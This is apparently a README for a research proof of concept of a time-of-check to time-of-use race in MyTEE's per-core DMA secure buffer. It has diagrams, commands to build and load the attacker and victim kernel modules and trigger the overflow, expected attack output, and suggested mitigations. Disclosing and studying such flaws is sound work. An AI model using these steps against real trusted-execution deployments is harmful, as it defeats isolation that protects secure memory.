# MyTEE TOCTOU Attack - Proof of Concept

## Overview

This PoC demonstrates a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability in MyTEE's DMA secure buffer implementation. The vulnerability arises from:

1. **No boundary check** when copying Control Blocks (CBs) to secure buffer
2. **No core isolation** between adjacent secure buffer regions
3. **Race condition** between CB verification and DMA execution

## Vulnerability Details

### Secure Buffer Layout

```
SECURE_BUFFER_BASE (0x8F1FB000)
│
├── Core 0 Buffer: 0x8F1FB000 - 0x8F1FBFFF (4KB, 128 CBs max)
│   ├── CB[0]   @ 0x8F1FB000
│   ├── CB[1]   @ 0x8F1FB020
│   ├── ...
│   ├── CB[127] @ 0x8F1FBFE0  (last valid CB for Core 0)
│   └── CB[128] @ 0x8F1FC000  ← OVERFLOW into Core 1!
│
├── Core 1 Buffer: 0x8F1FC000 - 0x8F1FCFFF (4KB)
│   ├── CB[0]   @ 0x8F1FC000  ← Overwritten by Core 0's CB[128]
│   └── ...
│
├── Core 2 Buffer: 0x8F1FD000 - 0x8F1FDFFF (4KB)
└── Core 3 Buffer: 0x8F1FE000 - 0x8F1FEFFF (4KB)
```

### Attack Flow

```
Time ────────────────────────────────────────────────────────────────────►

Core 0 (Victim)          EL2 (Hypervisor)         Core 1 (Attacker)
     │                         │                         │
     │  DMA request (129 CBs)  │                         │
     │ ───────────────────────>│                         │
     │                         │                         │
     │                    ┌────┴────┐                    │
     │                    │ Copy CBs│                    │
     │                    │ to Sec  │                    │
     │                    │ Buffer  │                    │
     │                    └────┬────┘                    │
     │                         │                         │
     │                    CB[0-127] → Core 0 buffer      │
     │                    CB[128+]  → Core 1 buffer (!)  │
     │                         │                         │
     │                    ┌────┴────┐                    │
     │                    │ Verify  │                    │
     │                    │ CBs OK  │                    │
     │                    └────┬────┘                    │
     │                         │                         │
     │                    Start DMA                      │
     │                         │                         │
     │                         │         DMA request     │
     │                         │ <───────────────────────│
     │                         │                         │
     │                    ┌────┴────┐                    │
     │                    │ Copy    │                    │
     │                    │ Attacker│                    │
     │                    │ CBs     │  ← Overwrites CB[128+]
     │                    └────┬────┘    with malicious CB
     │                         │         (NOT YET VERIFIED!)
     │                         │                         │
     │    DMA executes CB[128] │                         │
     │    from Core 1 buffer!  │                         │
     │    (UNVERIFIED!)        │                         │
     │                         │                         │
     ▼                         ▼                         ▼
                    ┌──────────────────┐
                    │  ATTACK SUCCESS  │
                    │  Arbitrary DMA!  │
                    └──────────────────┘
```

## Files

| File | Description |
|------|-------------|
| `toctou_common.h` | Shared definitions and constants |
| `toctou_attacker.c` | Attacker module (runs on Core 1) |
| `toctou_victim.c` | Victim module (runs on Core 0) |
| `Makefile` | Build configuration |
| `run_attack.sh` | Attack demonstration script |

## Building

```bash
cd /home/grassplatypus/mytee_sec252/mytee_examples/toctou_attack

# Build modules
make

# Or with cross-compilation
make CROSS_COMPILE=arm-linux-gnueabihf- ARCH=arm
```

## Running the Attack

### Method 1: Using the Script

```bash
# Copy to target device
scp *.ko run_attack.sh pi@raspberrypi:/tmp/

# On target device
cd /tmp
chmod +x run_attack.sh
sudo ./run_attack.sh 129  # 129 CBs to overflow by 1
```

### Method 2: Manual Execution

```bash
# Terminal 1: Load attacker on Core 1
sudo taskset -c 1 insmod toctou_attacker.ko debug=1

# Terminal 2: Load victim on Core 0  
sudo taskset -c 0 insmod toctou_victim.ko cb_count=129 debug=1

# Trigger attack
echo 1 | sudo tee /sys/module/toctou_victim/parameters/trigger

# Check results
dmesg | grep -E "(ATTACKER|VICTIM|ATTACK)"
```

## Expected Output

```
[VICTIM] Loading TOCTOU victim module
[VICTIM] CB count: 129 (overflow at >128)
[VICTIM] CB count 129 WILL overflow by 1 CBs into Core 1
[VICTIM] CB chain created: 129 blocks
[VICTIM] CB[127] at offset 0xfe0 (last in Core 0 buffer)
[VICTIM] CB[128] at offset 0x1000 (OVERFLOW into Core 1!)

[ATTACKER] Loading TOCTOU attacker module
[ATTACKER] Attack thread started on Core 1
[ATTACKER] Waiting for victim to trigger DMA overflow...

[VICTIM] === TRIGGERING DMA OVERFLOW ATTACK ===
[VICTIM] Core 0 requesting DMA with 129 CBs
[VICTIM] Buffer overflow: CB[128+] will go into Core 1's region

[ATTACKER] Victim trapped in EL2! Injecting malicious CB...
[ATTACKER] Core 1 injecting malicious CB to Core 1 buffer
[ATTACKER] Malicious CB injected!
[ATTACKER] Verify: info=0xDEADBEEF src=0x41414141 dst=0x42424242

[VICTIM] DMA executing... CB[128+] will be from Core 1 buffer!
[VICTIM] === ATTACK SEQUENCE COMPLETE ===

[ATTACKER] *** ATTACK SUCCESS! ***
[ATTACKER] DMA executed unverified CB from Core 1 buffer
```

## Mitigation Recommendations

1. **Boundary Check**: Limit CB count to MAX_CBS_PER_CORE (128)
   ```assembly
   cmp cb_count, #128
   bgt overflow_error
   ```

2. **Core Isolation**: Use separate Stage-2 page table entries
   ```assembly
   @ Each core can only access its own buffer region
   @ Other cores' regions are unmapped or read-only
   ```

3. **Atomic Verification**: Disable interrupts during copy+verify+execute
   ```assembly
   cpsid if  @ Disable IRQ/FIQ
   @ copy, verify, start DMA
   cpsie if  @ Re-enable
   ```

4. **Per-Core Locking**: Add spinlock for buffer access
   ```assembly
   @ Acquire lock before buffer access
   @ Release after DMA completion
   ```

## Technical Notes

### CB Structure (32 bytes)
```c
struct bcm2835_dma_cb {
    uint32_t info;      // 0x00: Transfer info
    uint32_t src;       // 0x04: Source address
    uint32_t dst;       // 0x08: Destination address  
    uint32_t length;    // 0x0C: Transfer length
    uint32_t stride;    // 0x10: 2D stride
    uint32_t next;      // 0x14: Next CB address
    uint32_t pad[2];    // 0x18: Padding
};
```

### Key Addresses
- Secure Buffer Base: `0x8F1FB000` (virtual), `0x0F1FB000` (physical)
- Buffer Size: `0x1000` (4KB) per core
- Max CBs: 128 per core (4096 / 32 = 128)

## License

This code is provided for security research purposes only.
